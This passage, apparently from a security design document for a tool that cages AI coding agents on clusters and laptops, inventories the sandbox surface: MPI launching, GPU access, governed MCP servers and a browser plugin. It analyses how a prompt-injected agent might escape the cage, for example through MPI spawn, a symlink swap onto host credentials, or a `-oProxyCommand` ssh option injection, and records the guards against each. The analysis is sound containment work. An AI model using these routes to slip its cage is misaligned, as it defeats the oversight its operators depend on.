profile may set `mpi: pmix` (or `pmi2`) — `JobProfile._validate_mpi`; the config
validator requires a parallel shape (`ntasks`/`nodes>1`/`ntasks_per_node`) so it
is never a silent no-op, and rejects it with `warm_pool_size` (a warm worker never
srun-launches). It is AUTHOR-set config, never agent request data.

For such a profile the dispatcher launches (`dispatcher.render_child_sbatch` →
`jobs.mpi_srun_launch_lines`, both security-surface):

```
exec srun --mpi=<flavor> --export=NONE /bin/bash -c '<PMIx bootstrap shim>' \
     bash "$BOT_APPTAINER_BIN" <caged apptainer exec argv[1:]>
```

- **`--export=NONE`** is the security lynchpin: SLURM strips the SUBMITTING env
  from each task, so the shim's prefix sweep can pick up ONLY slurmstepd-SET vars
  (`SLURM_*`/`PMIX_*`/`PMI_*`), never host login env or agent-controlled values.
- **The shim** (`jobs._PMIX_BOOTSTRAP_SHIM`, a COMPILE-TIME CONSTANT — no agent/
  config text interpolated) runs per rank OUTSIDE the container and (a) forwards
  `PMIX_*`/`PMI_*`/`SLURM_*` across `--cleanenv`/`--containall` via `APPTAINERENV_*`
  (apptainer injects these AFTER cleaning, so the cage stays byte-identical), (b)
  pins `PMIX_MCA_psec=native` (uid auth on the PMIx unix socket → no munge socket
  needed in the container), (c) binds ONLY `$PMIX_SERVER_TMPDIR` (the per-step
  rendezvous socket + dstore dir) via `APPTAINER_BIND` — never host `/tmp`, and (d)
  `exec "$@"` runs the pre-validated caged argv VERBATIM (argv-not-shell). argv[0]
  is resolved to an absolute apptainer path in the batch env because `--export=NONE`
  clears the task PATH.

**Why this does not widen the cage:** the injected env/bind survive `--cleanenv`/
`--containall` precisely because apptainer applies `APPTAINERENV_*`/`APPTAINER_BIND`
last; `--no-privs`/`--drop-caps all` are untouched (MPI needs no privilege). The
env values + bind source are slurmstepd-set and, under `--export=NONE`, cannot be
influenced by the caged agent. **Blast radius:** the PMIx server is per-job-step,
0700 user-owned; a caged rank can only join its OWN step's namespace (put/get/fence
data it already owns, abort its own step) — not the scheduler, not other users/jobs.
The env forwarded inward is info-disclosure only (hostnames, jobid/uid, tmpdir
layout). Image side: the `.sif` needs a PMIx-capable MPI (OpenMPI ≥ 3.1; PMIx ≥
2.1.1 is cross-version compatible, so no rebuild vs the host PMIx).

**Same-node shared-memory is forced to a cage-safe path.** The shim
also exports `OMPI_MCA_pml=ob1` + `OMPI_MCA_btl_vader_single_copy_mechanism=none`.
WHY: the cage drops `CAP_SYS_PTRACE` and splits PID namespaces, so OpenMPI's
default single-copy shared memory (CMA / `process_vm_readv`) doesn't just fail — it
**SEGFAULTS**. `ob1` avoids UCX's CMA transport and vader single-copy=none uses a
2-copy shared segment. Both are static compile-time constants of the same class as
`psec=native`, harmless if the image's MPI isn't OpenMPI/UCX. The agent is told
this in AGENT_HINTS ("Running compute jobs" → MPI note) so it doesn't re-diagnose
the segfault or add its own `OMPI_MCA_*` env. **Still deferred (perf only):** a
`/dev/infiniband` bind — until then inter-node is TCP, so the `ob1` pin costs
nothing; revisit both together. Wired logic is unit-tested (`test_hpc_jobs_mpi.py`,
incl. an end-to-end shim run proving env forwarding + no shell injection from a
metachar PMIx value); actual cross-node communication needs live-cluster validation.

**Security posture — residual risk (adversarial study; full report
internal design note DN-013).** The PMIx CONTROL plane is
isolated: each rank talks only to its OWN node's slurmstepd over a local 0700 unix
socket (`psec=native` = a uid check, NOT a cross-node weakening — ranks never make
direct cross-node PMIx connections; cross-node modex/collectives are relayed
stepd↔stepd on the host, authenticated by Slurm's own MUNGE, which the container's
psec never touches). A DIFFERENT user is fully blocked (uid + 0700 + unbound
socket); the user's OWN other sessions are blocked too (the shim binds only THIS
step's `$PMIX_SERVER_TMPDIR`, and the caged agent cannot add binds). `psec=munge`
in the container would add zero cross-node rank auth — keep native. The DATA plane
is NOT isolated: OpenMPI ob1/TCP rank↔rank has **no authentication and no
encryption** — the connect handshake carries only the public constant
`"OPAL-TCP-BTL"` + `jobid+vpid` (no secret/nonce/key), and because apptainer shares
the host network namespace with no per-job network isolation, those ephemeral
ports are reachable across the cluster fabric; a party who learns `host:port` can
read/inject a rank's MPI messages. **botainer therefore gives NO confidentiality
or integrity guarantee for inter-rank MPI traffic and relies on the trusted
cluster network.** This is the standard MPI-over-TCP posture (NOT botainer-specific)
and is WITHIN the cage's model — the cage limits privilege / credentials /
filesystem, never the network; caged jobs already have unrestricted host-network
egress. Binding InfiniBand later is a performance change, NOT an auth control.
**Dynamic-spawn cage escape — CLOSED BY CONSTRUCTION** (spawn-detection study): a caged rank asking the uncaged host stepd to launch an uncaged task
would be a real escape, BUT Slurm's `mpi/pmix` plugin hardcodes the spawn handler
to `PMIX_ERR_NOT_SUPPORTED` (compile-time constant; verified on master + 22.05), so
under `srun --mpi=pmix` — botainer's launcher — spawn is refused on EVERY Slurm
cluster. The escape only exists via PRRTE/`mpirun`, which botainer never uses. There
is no client-side env knob to disable spawn (none exists); the guarantee IS the
launcher choice, so "botainer MPI dispatch always launches `srun --mpi=pmix`, never
`mpirun`/`prterun`" is pinned as a tested invariant
(`test_mpi_launcher_is_srun_never_mpirun_prrte`). Optional belt-and-suspenders: a
one-time `MPI_Comm_spawn` probe in the onboarding canary (SAFE = refused).

## 4as. GPU jobs expose the device with `--nv` (#68)

> **A GPU job gets `--nv`, or it does not get the GPU.** Before this a GPU job
> got the device
> ALLOCATED (`#SBATCH --gres=gpu:N`) but the caged `apptainer exec` never got
> `--nv`, and `--containall` gives a minimal /dev that HIDES `/dev/nvidia*` — so
> the workload could not actually see the GPU. GPU jobs are offered in the example
> profiles + treated as supported here, so this was a claimed-but-dead capability.

`jobs.compose_child_job_argv(..., gpus)` now adds `--nv` (bind the host NVIDIA
driver libs + `/dev/nvidia*` into the container) when `gpus > 0`, positioned after
the §4 cage flags and before the image. It needs no privilege, so the cage
(`--no-privs --drop-caps all --containall`) is unchanged. Threaded on BOTH the cold
path (`dispatcher.submit_request` passes the resolved gpus) and the warm-pool path
(`render_worker_sbatch` passes `--gpus` → `pool worker` → `worker_loop` →
`worker_process_one`). CPU jobs never get `--nv`. AMD (`--rocm`, gpu_type-gated) is
a follow-up. Unit-tested (`test_hpc_jobs_child.py`); real GPU-node exposure needs
live-cluster validation.

**Extended to SESSIONS (#177).** The paragraph above was true of dispatched jobs
and warm-pool tasks and false of an ordinary session: `hpc submit --gpus N`
emitted `#SBATCH --gres=gpu:N`, took the allocation, and launched a container
with no `--nv`. `ResourceSpec.gpus` had been removed in #175 on the rule "only
fields an adapter reads live here" — correct for `time_minutes`, `partition`,
`account` and `gpu_type`, wrong for `gpus`, which means two things at once:
Slurm ALLOCATES the device, and the container must separately be allowed to SEE
it. Restored and rendered by both adapters — `--nv` (apptainer), `--gpus N`
(docker).

**What `--nv` costs, stated because "needs no privilege" is not the same claim.**
It binds the host's NVIDIA driver libraries — real host paths, selected by
apptainer's nvliblist, that are NOT enumerated in the §1/§2 tables — and exposes
`/dev/nvidia*`, `/dev/nvidiactl` and `/dev/nvidia-uvm`, i.e. direct ioctl access
to the GPU driver from an untrusted, prompt-injectable process. On a shared node,
device memory is not guaranteed zeroed between jobs; that is a known class for
GPUs and is not a measurement of any particular cluster. **The widening that
matters here is reach, not the flag**: this capability was previously available
only through a *job* — profile-capped and policy-checked — and is now reachable
from an ordinary interactive session, bounded only by what Slurm grants.

**Local (docker) behaviour.** On **macOS** a GPU request is REFUSED at compose:
Docker Desktop runs Linux in a VM with no NVIDIA passthrough, and Apple-Silicon
GPUs are not exposed to Linux containers, so the request cannot be honoured under
any configuration. The refusal names the alternatives (`resources.gpus: 0`, a
Linux NVIDIA host, or `hpc submit`) rather than letting dockerd emit an error the
user must decode. *This platform fact is taken from documentation, not measured —
there is no Docker daemon in the dev container.* On **Linux** it WARNS and
proceeds: whether the NVIDIA Container Toolkit is installed cannot be known at
compose time without calling the daemon, so refusing would break every correctly
configured GPU host, and silence would reproduce #177's failure-far-from-cause.
`_refuse_or_warn_on_gpu_request` (`core/composition.py`); apptainer is never
platform-checked, since `--nv` degrades to "no device visible" rather than
failing. Still NOT validated on a real GPU node, on either path.

## 4at. Governed MCP servers — plugin `contributes.mcp_servers`

> **An MCP server reaching the agent is a GOVERNED grant, not a side effect.**
> Before this botainer had no first-class notion of MCP (Model Context Protocol)
> servers — Claude Code read
> its own config and botainer didn't govern it, so an MCP tool (which can touch
> network / filesystem / run commands) was an UNGOVERNED backdoor around the
> capability model.

A plugin may now declare `contributes.mcp_servers: [{name, command, args, env}]`
(`plugins/manifest.py::McpServerDecl`). The launcher writes these into the agent's
MCP config ONLY when the plugin is enabled, so an MCP tool becomes a GOVERNED grant:
- it runs INSIDE the §4 cage (same isolation as the agent);
- it inherits the plugin's trust. This is the part to read carefully, because an
  MCP server is a SUPPLY-CHAIN grant: enabling a plugin that ships one means its
  tools can touch network, filesystem and commands, with the plugin's tier and
  trust-lock as the only thing standing behind them. **That grant is not
  currently itemised for the user anywhere.** The capability summary names no
  MCP server and no tool — `mcp_capability_lines` exists but nothing calls it,
  so per-tool disclosure is a FOLLOW-UP, listed below, not something this
  document should be read as promising. What you get today is the trust chain
  (enabled + tier + lock), not a session-start list of what those tools can do;
- every field is charset-guarded at parse time (name `[A-Za-z0-9_.-]+`; command
  non-empty, no leading dash, no control chars; args control-char-free; env keys
  are identifiers, values control-char-free) — config → argv+env, never shell.

DELIVERY (wired, composition.py §6b): the enabled plugins' `mcp_servers`
are merged (`plugins/mcp.py::render_mcp_servers`; duplicate name across plugins
REFUSED) and written to a launcher-owned `mcp-servers.json`, bound RO at
`/workspace/.botainer/mcp-servers.json` (same generated-file+bind pattern as
AGENT_HINTS.md). Claude Code is then launched with `--mcp-config <that path>
--strict-mcp-config` — appended to the INNERMOST agent wrap by TRUSTED compose
(alongside the #53 permission flags; NOT a plugin `command_append`, which stays
refused), Claude-family only. When the flag IS passed, `--strict` means the agent
gets exactly these governed servers and no ungoverned ones (project `.mcp.json`,
user `.claude.json` and connectors are all excluded).

**BUT IT IS CONDITIONAL, and this paragraph used to imply otherwise.** Both the
file and the flag are produced ONLY when an enabled plugin actually contributes
an MCP server — `composition.py` gates the file on `if _mcp_cfg:` and the flag on
`if _mcp_target is not None:`. In the DEFAULT configuration, where no plugin
contributes one, botainer passes **no `--strict-mcp-config`**, and Claude Code
reads its ordinary sources, including a `.mcp.json` that arrived with a cloned
repository. The sentence "an MCP tool can only reach the agent THROUGH an
enabled, trust-locked plugin" was true only in the contributing case. The test
below asserts the absence as intended, so the condition is deliberate — the
CLAIM was the error, not the code.

**The project channel stays open.** A server named in a cloned repo's `.mcp.json` runs stdio INSIDE the
cage; under the default `agent_permissions: bypass` the agent already has
arbitrary command execution there, so it confers no capability the agent lacked,
and under `network.mode: none` it reaches no network. What the file does get is a
place in the model's tool schema — repo-authored tool names and descriptions.
That is **the risk of cloning a repository at all**, not a surface peculiar to
MCP: the same clone can carry a `Makefile`, a `package.json` `postinstall`, a
build script or a git hook, each of which acts when something runs it. Singling
out `.mcp.json` while accepting the rest would cost the feature and buy little.
Mitigation for that whole class — including whether botainer should render its
policy into the AGENT'S OWN settings rather than blanket-bypassing prompts — is
tracked as research, not as a blocker.

Proven end-to-end in test_compose_end_to_end.py
(file+bind+flag present when a plugin contributes; absent when none do). Follow-ups:
splice per-tool lines into the capability summary (`mcp_capability_lines` exists);
codex MCP delivery (config.toml); the browser plugin as the first real consumer.

## 4au. `browser` plugin — headless web browser for the agent (opt-in)

> **The browser stack must be IN THE IMAGE; it cannot be installed at run time.**
> Three independent reasons, any one of which is fatal: (1) the cage has no root
> and no `apt`, so Chromium's ~30 system libraries cannot be added; (2) under
> apptainer the container runs as the caller's host uid with `HOME=/`

> start the agent silently drops it and falls back to hand-rolled installs that

> chromium` (pulls every runtime lib), `npm install -g @playwright/mcp` (so the
> server is the pre-installed binary `playwright-mcp` — NO runtime `npx`,
> so no writable-HOME dependency), and pre-install Playwright's matching Chromium
> into `PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`. The plugin's `mcp_servers`
> command is now `playwright-mcp --headless --no-sandbox --isolated
> --executable-path /usr/bin/chromium` (no env). The `--executable-path` is
> REQUIRED: @playwright/mcp defaults to the Google-Chrome *channel*
> (`/opt/google/chrome/chrome`, unavailable — and Chrome-for-Linux isn't built
> for arm64); pointing it at the image's system Chromium overrides the channel
> (verified by an empirical MCP-stdio test; `--browser` won't accept
> "chromium"). Changing the arg is manifest-only (`botainer setup` to re-copy the
> plugin + restart; no image rebuild). **The initial bake still requires
> `botainer image build agent-claude`
> [`--runtime apptainer`]).** Cost: ~400 MB added to the agent image + the browser
> (a prompt-injection amplifier running `--no-sandbox`) now lives in the cage —
> the leaner-but-unproven alternative is the helper-container-over-CDP path (§4av,
> which the VIEWER already uses). NOT yet run end-to-end on real hardware (no
> docker/apptainer in the dev container); the build carries loud `FATAL:` asserts
> so a wrong bin/path fails the BUILD, not silently at runtime.


> First consumer of the governed-MCP mechanism (§4at). Bundled, OPT-IN, off by
> default (in `BUILTIN_PLUGIN_NAMES`; enabled only by `plugins_enabled: [browser]`).

When enabled, the agent gets a `browser` MCP tool (Playwright): open pages, click,
type, read page text/snapshot, screenshot — a HEADLESS Chromium inside the §4 cage.
Delivered via §4at (the launcher writes it into `--mcp-config`, `--strict`). Command
is fixed + trust-locked: the pre-installed binary `playwright-mcp --headless
--no-sandbox --isolated --executable-path /usr/bin/chromium` (NO runtime `npx`, so
no writable-HOME dependency). Chromium + its ~30 system libs + the matching
Playwright browser are BAKED into the agent image (`apt install chromium`;
`PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`) — nothing is fetched at runtime. See
the banner above for why the old "fetched at first use, no bloat" design was wrong.

CAPABILITY / RISK (why opt-in):
- **Network egress** — the whole point; requires `network.mode: internet` (browsing
  fails otherwise). Not enforced at compose yet — follow-up; today the agent_hints
  warns + it fails clearly.
- **`--no-sandbox`** — Chrome's own sandbox needs the privileges the cage drops
  (`--no-privs`/`--drop-caps all`), so it runs unsandboxed; a malicious page
  exploiting a Chrome bug gets code-exec INSIDE the cage (same blast radius as an
  already-compromised agent, a lower bar). Mitigation: opt-in + frequent image
  rebuilds. (The VIEWER, §4av, does NOT change this: it runs the SAME in-cage
  Chromium headed rather than headless — it is not a separate, more-privileged
  browser.)
- **Prompt-injection amplifier** — the agent visits attacker-controlled pages.
Default is headless (no window). Manifest + delivery validated; end-to-end (agent
calls tool → Chromium browses) needs a real Claude Code session to shake down.

## 4av. `browser` plugin — watchable VIEWER (opt-in)

> Second mode of the `browser` plugin: a headed browser you can SEE and CLICK
> (e.g. to log in), then hand back to the agent. OFF by default; enabled per
> project with `plugins.browser.viewer: true`. Trust: `kind: host_helper`,
> `trust_required: hooked` (first-party, so no extra consent gate — the "helper"
> is the host-side hook, not a container).

> **⚠ TRUST INVERSION (user-flagged) — applies to `viewer_mode:
> legacy`.** The legacy viewer is the one place botainer has the USER connect a
> client (their browser) to a server the UNTRUSTED container controls, and load
> a page it serves. This inverts the normal trust flow: server-side controls
> (clipboard flags, etc.) are NOT a boundary — a compromised agent/page can
> serve hostile code to the user's browser (clipboard both ways, `127.0.0.1`
> probing, file/permission dialogs, browser exploits). The user's browser
> sandbox is the real protection. **Decision: accept it WITH a loud warning** —
> `browser watch` prints a big red block every time, and every place the plugin
> is documented repeats it; recommend a throwaway/private browser window.
> **The proper fix is `viewer_mode: gateway` (Track B, opt-in — §"gateway
> mode" below for build status):** a host-side TRUSTED gateway serves
> known-good, vendored client assets and brokers only the RFB pixel+input
> byte-stream; the container serves NO code to the user's browser. Gateway mode
> REMOVES the served-hostile-code class; what remains is container-controlled
> PIXELS (visual phishing) and the (JS-sandboxed, pinned) noVNC decode of a
> hostile byte-stream — content risk, not code execution. Gateway is the
> DEFAULT; `legacy` is deprecated and kept only as a fallback. This trust-inversion
> rule generalizes to ANY future capability that has the user connect a client
> to a container-served endpoint (see the trust-inversion warning above).

> **RE-ARCH.** The original design started a SEPARATE helper container
> and made the agent reach its Chromium over CDP (`host.docker.internal:<port>` /
> a node-local socket). That was unreliable on every platform and DEAD-ON-ARRIVAL
> on a Mac (`socket hang up`: host.docker.internal can't reach a loopback-published
> CDP port, and Chrome rejects the CDP `Host` header). It is REPLACED. The whole
> viewer stack now runs INSIDE the agent's own container; the agent drives its OWN
> local HEADED Chromium (no cross-container control); only the VNC *view* crosses
> to the human. There is no `browser` image any more (`plugins/browser/{Dockerfile,
> browser.def,start-viewer.sh}` deleted) — the viewer tools (Xvfb, x11vnc, noVNC,
> websockify≥0.12) are baked into the AGENT image (§4au) via the same rebuild.

Lifecycle: a `pre_session` host hook (`hooks/start_viewer.py`) — no container —
(1) mints the token, (2) sets env `BOTAINER_BROWSER_VIEWER=1` + the transport mode
so the agent entrypoint (`entrypoint_wrap.sh`) starts the in-container stack
(`botainer-viewer-start`: Xvfb → x11vnc → noVNC/websockify) BEFORE `claude`, and
(3) rewrites the agent's Playwright MCP from `--headless` to headed
(`rewrite_mcp_for_headed` — drops ONLY `--headless`, keeps `--no-sandbox` +
`--executable-path`, adds `--viewport-size`), so the agent's Chromium renders into
that display. A `post_session` hook (`hooks/stop_viewer.py`) just unlinks the
token (the stack dies with the container). This is the same in-cage Chromium as
headless mode — headed, not a separate/more-privileged browser (§4au risk note).

SURFACE / GUARDS:
- **Per-session token** — ~192-bit, minted by the hook `0600` in the session dir,
  bound **read-only** into the agent at `/run/viewer-token` (never on the argv/env
  → invisible in `docker inspect`/another user's `ps`). `botainer-viewer-start`
  reads it. On DOCKER it configures websockify's `TokenFile` plugin and the token
  rides the noVNC WebSocket PATH (`path=websockify?token=…`), so websockify
  REQUIRES it to upgrade the socket (a wrong/absent token → rejected). On the
  APPTAINER/unix transport there is NO `TokenFile` (a token can't map to a unix
  target), so there the token is **advisory** and the `0700` socket perms are the
  gate — `browser watch` says so per-runtime (Fable-5 M3). The classic VNC
  password is NOT relied on either way.
- **Docker/laptop transport** — x11vnc listens on container-loopback
  `127.0.0.1:5900` (the internal hop); websockify listens on `0.0.0.0:6080` INSIDE
  the container netns — it must, because docker publishes the port with `-p
  127.0.0.1:<host>:6080` on a bridge network, which DNATs to the container's bridge
  IP (a container-loopback listener would refuse). noVNC (container `6080`) is
  published to a host **loopback** port by a compose-time `PortForward` (§4
  Network; `_resolve_port_forwards`, docker-only, `host_bind: 127.0.0.1`), so the
  host only exposes it on 127.0.0.1; the mandatory TokenFile token gates the ws
  upgrade; the container's own netns bounds the 0.0.0.0 listen. Single-user host;
  the human opens `http://127.0.0.1:<host-port>/vnc.html?…`. `botainer plugin
  browser watch` reads the chosen host port from `spec.port_forwards`.
- **No routable port on shared nodes (apptainer/HPC)** — NO TCP and NO port
  forward (the apptainer adapter refuses `port_forwards`). x11vnc + websockify bind
  `0700` UNIX SOCKETS under a node-local dir bound into the cage at `/run/viewer`;
  the human reaches noVNC via `ssh -L <port>:<socket> <node>` (optionally
  `-J <login>`). A node-neighbor cannot reach a `0700` socket. The viewer contributes
  `/run/viewer-token` + `/run/viewer`; the browser plugin also contributes
  `/run/browser-auth.json` for credential handoff (below). All three are declared in
  `contributes.mount_target_prefixes` and enforced by the pre_session bind-envelope.
- **Credential handoff (`plugins.browser.storage_state`).** A Playwright
  storage-state file the human captured on their OWN machine is bound **RO** at
  `/run/browser-auth.json` and passed to the browser via `--storage-state`, so the
  agent's browser starts logged in without the human typing a password inside the
  container. The hook does NOT bind the user's file directly: it **copies the content
  into the host-private session dir** (O_NOFOLLOW) and binds the copy — and refuses a
  symlinked path or (for a project-relative path) one that resolves OUTSIDE the
  project. This blocks a caged agent from swapping an agent-writable auth path for a
  symlink to a host credential (e.g. the broker refresh token) and getting it bound
  in on the next run (Fable-5 HIGH-1). The agent can read the session at
  `/run/browser-auth.json` — same as if it had logged in via the viewer.
- **Transport fails CLOSED (Fable-5 M1).** `botainer-viewer-start` requires
  `BOTAINER_VIEWER_MODE` to be explicitly `tcp` or `unix` — it never defaults to
  `tcp`. An unset mode on an apptainer node would otherwise open TCP `5900`/`6080`
  on the shared, multi-tenant netns (co-tenant-reachable, input-controllable); it
  refuses instead of guessing.
- **Fail-LOUD, not fail-open (CHANGED in the re-arch).** A `viewer: true` session
  that can't actually be watched would be an UNSUPERVISED headless agent the human
  thinks they can watch — worse than refusing. So (a) the entrypoint polls the
  display and **refuses to start** (exit 1, "rebuild the agent image or set
  viewer:false") if it doesn't come up, and (b) `botainer-viewer-start` additionally
  health-checks the HUMAN-FACING noVNC endpoint (the TCP port / the unix socket),
  not just the display, and exits non-zero if it never binds (Fable-5 M4) — so a
  half-up stack dies loudly instead of masquerading as "ready". This is the
  opposite of the old fail-open-to-headless behavior. Default (headless) sessions
  never set the env, so nothing changes there.

GATEWAY MODE (`viewer_mode: gateway` — Track B, THE DEFAULT):
- **Build status (keep current per-commit):** the container side AND the
  laptop-side `botainer plugin browser gateway` runtime (the trusted broker
  + websockify) are implemented and were **verified end-to-end on docker**:
  a real gateway-mode session, RFB on the wire required VNC-auth
  (type 2, no None), the broker served the CSP'd page from the laptop, wrong
  token and wrong Origin (CSWSH) were both 403'd, a correct handshake bridged
  to the live x11vnc, and noVNC rendered the container display in a browser.
  **HPC is wired but NOT yet cluster-tested** (the `ssh -L` path + node/socket
  job-start recording — H5/H6 — remain the HPC-phase follow-up; the gateway
  refuses a not-yet-recorded node rather than guessing). This is the DEFAULT
  path on HPC, not an opt-in one: `viewer: true` gets gateway unless the
  config asks for `legacy`. It fails closed — a refusal, never a silent
  fallback to legacy — and a cluster shakedown is outstanding work.
- **Config**: `plugins.browser.viewer: true` is enough — `viewer_mode`
  defaults to `gateway`. The AUTHORITY for that default is
  `plugins/browser/botainer-plugin.yaml`; two Python readers duplicate it
  because plugin hooks run standalone and cannot import the package, and
  `tests/unit/test_browser_viewer_mode_default.py` fails if the three
  disagree. The hook (`start_viewer.viewer_mode`) REFUSES unknown modes
  (typed error, no silent posture pick); compose's copy
  (`_browser_viewer_mode`) resolves anything that is not an explicit
  `legacy` to gateway, so an unrecognised value lands on the safer mode.
- **Container side = RFB ONLY.** `botainer-viewer-start` (gateway branch):
  Xvfb → x11vnc with `-passwdfile /run/viewer-rfb-pass` — NO in-container
  noVNC/websockify, no web content served from the cage. x11vnc must
  AUTHENTICATE now because its endpoint is laptop-reachable (docker publish /
  ssh forward): the hook mints a per-session 8-char RFB password (VNC auth
  caps at 8 bytes; ≈47 bits — the second gate behind the loopback-only
  publish), 0600 in the session dir, bound RO at `/run/viewer-rfb-pass`
  (declared in the envelope; never on env/argv). The stack FAILS CLOSED if
  the password bind is missing — it never serves unauthenticated RFB.
- **Docker transport**: compose publishes container `5900` to a host loopback
  port (`PortForward` label `browser viewer (RFB)`, mirrors the S4 noVNC
  forward; gateway sessions get NO 6080 forward). x11vnc binds the container
  netns non-loopback (docker's `-p 127.0.0.1:<host>:5900` DNATs to the bridge
  IP — same constraint as the legacy websockify listen); host exposure stays
  loopback-only via the publish.
- **Apptainer/HPC transport**: x11vnc on a `0700` unix socket
  (`<session>/viewer/vnc.sock`, bound at `/run/viewer`), `-rfbport 0` — zero
  TCP on the shared netns; reached via `ssh -L <port>:<socket> <node>`. Socket
  perms are the primary gate; the RFB password ALSO applies (it gates the
  laptop end of the forward). Node/socket recording remains provisional until
  job-start recording lands (H5/H6, same as legacy).
- **Laptop side (the trusted gateway, `botainer plugin browser gateway`)**:
  requires the optional `botainer[gateway]` extra (pulls `websockify` into
  botainer's own env; the command preflights it UPFRONT and fails fast with the
  install hint if absent — no partial/insecure startup). It then
  serves the VENDORED, pinned noVNC 1.7.0 (`plugins/browser/gateway_web/`,
  two-channel hash-verified at vendor time — see PROVENANCE.md) from the
  laptop under `strict_csp()` response headers, a per-RUN ~192-bit ws token,
  websockify on a `--unix-listen` 0700 socket (browsers cannot dial a unix
  socket → drive-by pages can't reach the WS terminator), an Origin+Host-
  checking local broker as the only browser-reachable listener (CSWSH kill),
  and a throwaway `--user-data-dir` browser profile (deleted on exit).
  Clipboard is UNWIRED in both directions (B4 default-none). The RFB password
  reaches the page via URL FRAGMENT (never in HTTP request lines).
  NB the RFB password's job is to gate OTHER local processes on the user's
  machine out of the published/forwarded RFB port. It is enforced by x11vnc
  INSIDE the untrusted container, so it is NOT a control against the
  container itself — the container can always neutralize its own x11vnc,
  which only denies the user their view (the gateway fails loud); it cannot
  hijack the user's client. Nothing in this design may ever rely on the
  container honoring the password.
- **What gateway mode does NOT fix**: the container still fully controls the
  PIXELS (visual phishing) and the RFB byte-stream noVNC decodes (pinned,
  pure-JS, browser-sandboxed — CVE-2017-18635 class closed by ≥0.6.2). The
  session remains a relatively-trusted-session feature.
- **Single-user-laptop assumption (review LOW).** The viewer URL — carrying the
  ws token (query) and the RFB password (`#fragment`) — is passed as a browser
  argv, so it is visible in the laptop's process table (`ps auxww`) to OTHER
  local users for the browser's lifetime; the RFB password's job is exactly to
  gate other local processes, so a co-login user who reads it could reach the
  loopback-published RFB. The fragment IS kept out of HTTP request lines,
  Referer, and the gateway's own logs (the process table is the residual). This
  matches the stated posture: the gateway assumes a single-user trusted laptop.
- **SSH option-injection guard (review HIGH).** On HPC the gateway builds an
  `ssh -L … <node>` argv from the session record; `<node>` is the trailing
  positional, so a value starting with `-` would be parsed as an ssh OPTION
  (`-oProxyCommand=…` = RCE on the laptop). Because the HPC session record is
  bound RW into the untrusted container, the gateway REFUSES a node/socket/login
  that begins with `-` (fail closed) before spawning ssh.
- **The gateway command is a FOREGROUND server** (unlike legacy `watch`, which
  prints a URL and returns): the broker + websockify run FOR THE LIFETIME of
  `botainer plugin browser gateway`, on the laptop. Stop the command and the
  viewer port closes (browser → "unable to connect"). It prints the URL loudly
  (reopenable while it runs) and a browser-launch failure no longer crashes it
  (the server stays up; open the URL manually).
- **Legacy is DEPRECATED.** It is selected only by an explicit
  `viewer_mode: legacy`, and is scheduled for removal; `browser watch` serves
  it while it exists. In
  gateway mode `browser watch` redirects to `browser gateway`. Simplification
  ledger: gateway mode is NET-ADDITIVE today (two viewer postures coexist);
  what it replaces is the in-container noVNC/websockify stack, and the
  retirement trigger is the HPC shakedown — after it, flip the default to
  gateway and delete the legacy web stack from the image + this section.

NEEDS-VERIFY (real-hardware shakedown; deterministic wiring is unit-tested in
`tests/unit/test_browser_viewer_hook.py` + `test_browser_watch.py` + the
`_resolve_port_forwards` tests in `test_web_ports.py`; the container-runtime side
is NOT):
- **HPC node/socket recording (H5/H6).** Compose-at-submit runs the hook on the
  LOGIN node; the compute node + resolved node-local socket path are only known at
  JOB START. Today the hook records a placeholder under the session dir; `browser
  watch`'s remote command is best-effort until job-start recording + a
  `$SLURM_TMPDIR` node-local socket splice land (HPC-test-phase follow-up).
- websockify token enforcement on the pinned version (must REJECT a wrong/absent
  token, not merely advise) — asserted at image-build time; confirm at runtime.
- docker host-port TOCTOU: the noVNC host port is pre-picked free at compose (same
  shape as the broker's port pick); if it races before launch, `docker run` fails
  loudly (fast-fail/doctor hint), it does not silently mis-bind.

## 5. Things NOT in this inventory (assertions)

If you find yourself wanting to add one of these to the surface, stop
and ask whether the architecture is right. These are deliberately
absent:

- `/var/run/docker.sock` — never. The agent cannot launch sibling
  containers.
- Host `~/.ssh/` — never (except via the future `ssh_forward` capability
  with its own opt-in policy gate).
- Host `~/.aws/`, `~/.kube/`, `~/.config/<anything-credentialed>` —
  never.
- `/etc/passwd`, `/etc/shadow`, `/proc`, `/sys` (writable) — the
  runtime provides minimal `/proc`; nothing host-private is exposed.
- The launcher's own venv directory — the agent doesn't need to know
  where botainer is installed.
- The user's shell rc files — not bound; not visible.

The codex/sharp-edges/insecure-defaults review skills should be run
against any commit that proposes adding to this list.

## Update protocol

When you change the runtime's surface:

1. Edit the relevant section of this file in the same commit as the
   code change.
2. Run `pytest tests/integration/test_capability_surface_matches_inventory.py`
   — it re-checks the standing negatives against a rendered session. It does
   NOT compare the tables to that render, so it will not tell you a row is
   missing or stale. Step 1 is the guarantee, and step 1 is a human one.
3. If you're widening an entry (RO→RW, narrower→broader), add the
   commit SHA to the "Widening checkpoint" of that row.
4. For CRITICAL/HIGH-surface changes (any new bind, any env-var
   propagated through a security boundary like `--cleanenv`, any
   relaxation of network mode), run `/second-opinion` BEFORE merge.

5. **When the change touches a listed file but not the surface**, say so in
   the commit message and skip step 1:

       Surface-Neutral: renames a local; no bind, env, capability
                        or argv change

   **JUDGE TWO SURFACES, not one** (decided 2026-09-12, after the field was used
   to two different standards in one week):

   | surface | what moves |
   |---|---|
   | THE CAGE | a bind, an env var crossing `--cleanenv`, a capability grant, a plugin envelope, an argv element, a refusal boundary |
   | THE HUMAN | whether a refusal MOVES, whether a flag or off-switch appears or disappears, what a user is TOLD or ADVISED |

   Cage-unchanged is **not sufficient**. One commit asserted neutrality while
   moving a refusal in both directions and adding a user-facing off-switch a
   shipped guide then recommended — the cage really was identical, and the
   assertion was still the wrong shape.

   So the field carries one of two legal shapes: **(a)** nothing changes, and
   why; or **(b)** what DOES change and in which DIRECTION ("no refusal added or
   relaxed and the cage is identical; what changes is DISCLOSURE: X now says Y
   where it was silent"). (b) is the honest answer when the cage holds and the
   human surface moves — not a loophole. Asserting (a) when (b) is true is the
   misuse this paragraph exists to name.

   The repository's commit gate accepts this in place of an edit to this file.
   It exists because the alternative was worse: a one-line fix to a warning
   string in `botainer/cli/auth.py` needed either an unrelated entry here —
   diluting a contract with maintenance notes — or bypassing verification
   entirely, which the project forbids. The refusal text had offered this skip
   since it was written and provided no way to take it.

   **It is an ASSERTION, not a verification.** The tool cannot tell a comment
   change from a capability change; nothing about the trailer makes the claim
   true. It is a trailer rather than a flag so it is permanent and greppable —
   `git log --grep='^Surface-Neutral:'` lists every use, so a wrong one is
